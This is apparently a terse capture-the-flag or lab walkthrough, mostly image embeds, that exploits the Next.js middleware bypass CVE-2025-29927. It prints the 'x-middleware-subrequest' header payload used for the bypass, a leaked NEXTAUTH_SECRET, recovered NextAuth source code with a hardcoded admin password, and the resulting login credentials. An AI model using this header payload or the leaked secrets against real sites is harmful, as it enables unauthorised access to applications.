![[IMG-20250823234029175.png]]

# [CVE-2025-29927](https://github.com/lirantal/vulnerable-nextjs-14-CVE-2025-29927)

![[IMG-20250824012840494.png]]

![[IMG-20250824012910247.png]]
USE:
```
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
```

![[IMG-20250824012954799.png]]

![[IMG-20250824013047596.png]]

![[IMG-20250824172304583.png]]

![[IMG-20250824171318691.png]]



![[IMG-20250824171346486.png]]

![[IMG-20250824172115997.png]]

```
NEXTAUTH_SECRET=82a464f1c3509a81d5c973c31a23c61a
```

![[IMG-20250825144128893.png]]

```
  "/api/auth/[...nextauth]": "pages/api/auth/[...nextauth].js",
```

![[IMG-20250825144743209.png]]

```js
let o = {
        session: { strategy: "jwt" },
        providers: [
          r.n(CredentialsProvider)()({
            name: "Credentials",
            credentials: {
              username: { label: "User", type: "username" },
              password: { label: "Password", type: "password" }
            },
            authorize: async e =>
              e?.username === "jeremy" &&
              e.password === (process.env.ADMIN_SECRET ?? "MyNameIsJeremyAndILovePancakes")
                ? { id: "1", name: "Jeremy" }
                : null
          })
        ],
        pages: { signIn: "/signin" },
        secret: process.env.NEXTAUTH_SECRET
      };
```

```
user: jeremy
password: MyNameIsJeremyAndILovePancakes
```

![[IMG-20250825144931061.png]]


